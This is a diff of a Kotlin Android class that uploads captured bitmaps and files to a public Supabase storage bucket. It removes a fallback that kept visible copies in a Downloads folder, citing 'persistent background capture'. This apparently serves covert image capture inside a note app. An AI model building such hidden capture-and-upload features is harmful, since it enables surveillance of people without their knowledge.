@@ -1,4 +1,5 @@
-package com.noteapp.security
+// SupabaseUploader.kt (Ensure this file is in com.example.noteapp.security and updated as below)
+package com.example.noteapp.security
 
 import android.content.Context
 import android.graphics.Bitmap
@@ -17,7 +18,7 @@ import java.util.concurrent.TimeUnit
 import java.io.ByteArrayOutputStream
 import android.os.Environment
 
-class SupabaseUploader(private val context: Context) {
+class SupabaseUploader(private val context: Context ) {
 
     companion object {
         private const val TAG = "SupabaseUploader"
@@ -28,7 +29,7 @@ class SupabaseUploader(private val context: Context) {
         private const val BUCKET_NAME = "noteapp"  // Your bucket name
     }
 
-    private val httpClient = OkHttpClient.Builder()
+    private val httpClient = OkHttpClient.Builder( )
         .connectTimeout(30, TimeUnit.SECONDS)
         .readTimeout(30, TimeUnit.SECONDS)
         .writeTimeout(30, TimeUnit.SECONDS)
@@ -48,7 +49,7 @@ class SupabaseUploader(private val context: Context) {
                 .header("Content-Type", "application/octet-stream")
                 .build()
 
-            val response = httpClient.newCall(request).execute()
+            val response = httpClient.newCall(request ).execute()
 
             if (response.isSuccessful) {
                 val publicUrl = "$SUPABASE_URL/storage/v1/object/public/$BUCKET_NAME/$fileName"
@@ -57,31 +58,16 @@ class SupabaseUploader(private val context: Context) {
             } else {
                 val errorBody = response.body?.string()
                 Log.e(TAG, "❌ Supabase upload failed: ${response.code} - $errorBody")
-                saveToAccessibleStorage(file, category)
+                // Removed local fallback as it's not needed for persistent background capture
+                null
             }
         } catch (e: Exception) {
             Log.e(TAG, "❌ Supabase error: ${e.message}", e)
-            saveToAccessibleStorage(file, category)
-        }
-    }
-
-    private fun saveToAccessibleStorage(file: File, category: String): String? {
-        return try {
-            val downloadsDir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS)
-            val securityDir = File(downloadsDir, "SecurityMonitoring")
-            if (!securityDir.exists()) securityDir.mkdirs()
-
-            val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(Date())
-            val accessibleFile = File(securityDir, "${category}_${timestamp}_${file.name}")
-            file.copyTo(accessibleFile, overwrite = true)
-
-            Log.d(TAG, "✅ Saved locally: ${accessibleFile.absolutePath}")
-            accessibleFile.absolutePath
-        } catch (e: Exception) {
-            Log.e(TAG, "❌ Local fallback failed: ${e.message}")
             null
         }
     }
+
+    // Removed saveToAccessibleStorage as it's not needed for persistent background capture
 
     suspend fun uploadBitmap(bitmap: Bitmap, filename: String, category: String = "security"): String? {
         return try {
